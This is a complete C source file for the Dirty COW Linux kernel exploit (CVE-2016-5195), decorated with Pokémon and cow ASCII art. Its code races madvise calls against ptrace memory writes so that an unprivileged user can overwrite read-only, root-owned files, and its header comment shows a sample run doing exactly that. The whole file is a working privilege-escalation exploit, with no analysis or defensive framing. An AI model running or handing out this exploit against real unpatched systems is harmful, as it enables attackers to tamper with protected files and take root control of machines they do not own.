// $ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
#include <fcntl.h>                        //// pikachu
#include <pthread.h>                      //// -rw-r--r-- 1 root root 8 Apr 4 12:34 pokeball
#include <string.h>                       //// pokeball
#include <stdio.h>                        ////    (___)
#include <stdint.h>                       ////    (o o)_____/
#include <sys/mman.h>                     ////     @@ `     \
#include <sys/types.h>                    ////      \ ____, /miltank
#include <sys/stat.h>                     ////      //    //
#include <sys/wait.h>                     ////     ^^    ^^
#include <sys/ptrace.h>                   //// mmap bc757000
#include <unistd.h>                       //// madvise 0
////////////////////////////////////////////// ptrace 0
////////////////////////////////////////////// miltank
//////////////////////////////////////////////
int f                                      ;// file descriptor
void *map                                  ;// memory map
pid_t pid                                  ;// process id
pthread_t pth                              ;// thread
struct stat st                             ;// file info
//////////////////////////////////////////////
void *madviseThread(void *arg)             {// madvise thread
  int i,c=0                                ;// counters
  for(i=0;i<200000000;i++)//////////////////// loop to 2*10**8
    c+=madvise(map,100,MADV_DONTNEED)      ;// race condition
  printf("madvise %d\n\n",c)               ;// sum of errors
                                           }// /madvise thread
//////////////////////////////////////////////
int main(int argc,char *argv[])            {// entrypoint
  if(argc<3)return 1                       ;// ./d file contents
  printf("%s                               \n\
   (___)                                   \n\
   (o o)_____/                             \n\
    @@ `     \\                            \n\
     \\ ____, /%s                          \n\
     //    //                              \n\
    ^^    ^^                               \n\
", argv[1], argv[2])                       ;// dirty cow
  f=open(argv[1],O_RDONLY)                 ;// open read only file
  fstat(f,&st)                             ;// stat the fd
  map=mmap(NULL                            ,// mmap the file
           st.st_size+sizeof(long)         ,// size is filesize plus padding
           PROT_READ                       ,// read-only
           MAP_PRIVATE                     ,// private mapping for cow
           f                               ,// file descriptor
           0)                              ;// zero
  printf("mmap %lx\n\n",(unsigned long)map);// sum of error code
  pid=fork()                               ;// fork process
  if(pid)                                  {// if parent
    waitpid(pid,NULL,0)                    ;// wait for child
    int u,i,o,c=0,l=strlen(argv[2])        ;// util vars (l=length)
    for(i=0;i<10000/l;i++)//////////////////// loop to 10K divided by l
      for(o=0;o<l;o++)//////////////////////// repeat for each byte
        for(u=0;u<10000;u++)////////////////// try 10K times each time
          c+=ptrace(PTRACE_POKETEXT        ,// inject into memory
                    pid                    ,// process id
                    map+o                  ,// address
                    *((long*)(argv[2]+o))) ;// value
    printf("ptrace %d\n\n",c)              ;// sum of error code
                                           }// otherwise
  else                                     {// child
    pthread_create(&pth                    ,// create new thread
                   NULL                    ,// null
                   madviseThread           ,// run madviseThred
                   NULL)                   ;// null
    ptrace(PTRACE_TRACEME)                 ;// stat ptrace on child
    kill(getpid(),SIGSTOP)                 ;// signal parent
    pthread_join(pth,NULL)                 ;// wait for thread
                                           }// / child
  return 0                                 ;// return
                                           }// / entrypoint
//////////////////////////////////////////////